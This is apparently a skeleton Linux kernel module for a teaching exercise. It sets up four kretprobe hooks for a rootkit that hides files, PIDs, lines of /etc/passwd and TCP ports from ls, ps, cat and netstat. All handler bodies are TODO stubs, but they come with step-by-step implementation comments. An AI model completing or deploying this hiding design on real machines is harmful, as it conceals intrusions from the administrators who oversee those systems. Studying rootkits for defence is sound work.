// SPDX-License-Identifier: GPL-2.0
//
// Hiding hooks: 4 kretprobes that filter kernel output.
//
// 1. getdents64: hides files and PIDs from ls/ps
// 2. ksys_read:  hides lines from file reads (cat /etc/passwd etc)
// 3. tcp4_seq_show: hides ports from ss/netstat (IPv4)
// 4. tcp6_seq_show: hides ports from ss/netstat (IPv6)
//
#include <linux/dirent.h>
#include <linux/kprobes.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/seq_file.h>
#include <net/inet_sock.h>

#include "rootkit.h"

// Per-instance data saved by entry handlers, consumed by return handlers

struct getdents_data {
	unsigned long	ubuf;
	unsigned long	fd;
};

struct read_data {
	unsigned long	ubuf;
	unsigned long	count;
};

struct tcp_data {
	struct seq_file	*seq;
	int		saved_count;
	void		*sk;
};

// linux_dirent64 may not be exported; define locally
struct linux_dirent64 {
	u64		d_ino;
	s64		d_off;
	unsigned short	d_reclen;
	unsigned char	d_type;
	char		d_name[];
};

// ---- getdents64 probe: hide files and PIDs from directory listings ----

static int getdents_entry(struct kretprobe_instance *ri,
			  struct pt_regs *regs)
{
	// TODO: Save regs->si (ubuf) and regs->di (fd) into ri->data
	return 0;
}

static int getdents_return(struct kretprobe_instance *ri,
			   struct pt_regs *regs)
{
	// TODO:
	// 1. Get return value (bytes written to user buffer)
	// 2. If ret <= 0, return 0
	// 3. kmalloc(ret), copy_from_user the dirent buffer
	// 4. Walk linux_dirent64 records by d_reclen
	// 5. For each, check d_name against rk_file_targets and rk_pid_targets
	// 6. If match, memmove to remove entry, reduce ret
	// 7. copy_to_user the filtered buffer, update regs->ax
	// 8. kfree
	return 0;
}

static struct kretprobe rk_getdents_probe = {
	.handler	= getdents_return,
	.entry_handler	= getdents_entry,
	.data_size	= sizeof(struct getdents_data),
	.maxactive	= 20,
	.kp.symbol_name	= "__x64_sys_getdents64",
};

// ---- ksys_read probe: hide lines from file reads ----

static int read_entry(struct kretprobe_instance *ri,
		      struct pt_regs *regs)
{
	// TODO: Save regs->si (ubuf) and regs->dx (count) into ri->data
	return 0;
}

static int read_return(struct kretprobe_instance *ri,
		       struct pt_regs *regs)
{
	// TODO:
	// 1. Get return value (bytes read)
	// 2. copy_from_user the buffer
	// 3. Walk line by line using memchr for '\n'
	// 4. For each line, call rk_line_matches on rk_content_targets
	// 5. If match, memmove to remove line, reduce ret
	// 6. copy_to_user, update regs->ax
	return 0;
}

static struct kretprobe rk_read_probe = {
	.handler	= read_return,
	.entry_handler	= read_entry,
	.data_size	= sizeof(struct read_data),
	.maxactive	= 20,
	.kp.symbol_name	= "ksys_read",
};

// ---- tcp4_seq_show probe: hide ports from IPv4 socket listing ----

static int tcp4_entry(struct kretprobe_instance *ri,
		      struct pt_regs *regs)
{
	// TODO: Save seq_file (regs->di), seq->count, and sk (regs->si)
	return 0;
}

static int tcp4_return(struct kretprobe_instance *ri,
		       struct pt_regs *regs)
{
	// TODO:
	// If sk != SEQ_START_TOKEN and port matches rk_port_targets,
	// rewind seq->count to saved_count (hides the line)
	return 0;
}

static struct kretprobe rk_tcp4_probe = {
	.handler	= tcp4_return,
	.entry_handler	= tcp4_entry,
	.data_size	= sizeof(struct tcp_data),
	.maxactive	= 20,
	.kp.symbol_name	= "tcp4_seq_show",
};

// ---- tcp6_seq_show probe: hide ports from IPv6 socket listing ----

static int tcp6_entry(struct kretprobe_instance *ri,
		      struct pt_regs *regs)
{
	// TODO: Same as tcp4_entry
	return 0;
}

static int tcp6_return(struct kretprobe_instance *ri,
		       struct pt_regs *regs)
{
	// TODO: Same as tcp4_return
	return 0;
}

static struct kretprobe rk_tcp6_probe = {
	.handler	= tcp6_return,
	.entry_handler	= tcp6_entry,
	.data_size	= sizeof(struct tcp_data),
	.maxactive	= 20,
	.kp.symbol_name	= "tcp6_seq_show",
};

// ---- registration with per-probe rollback ----

int rk_filter_init(void)
{
	// TODO: Register all 4 kretprobes with goto rollback:
	// getdents -> read -> tcp4 -> tcp6
	// On failure, unregister previously registered ones
	return -ENOSYS;
}

void rk_filter_cleanup(void)
{
	// TODO: Unregister all 4 kretprobes (reverse order)
}
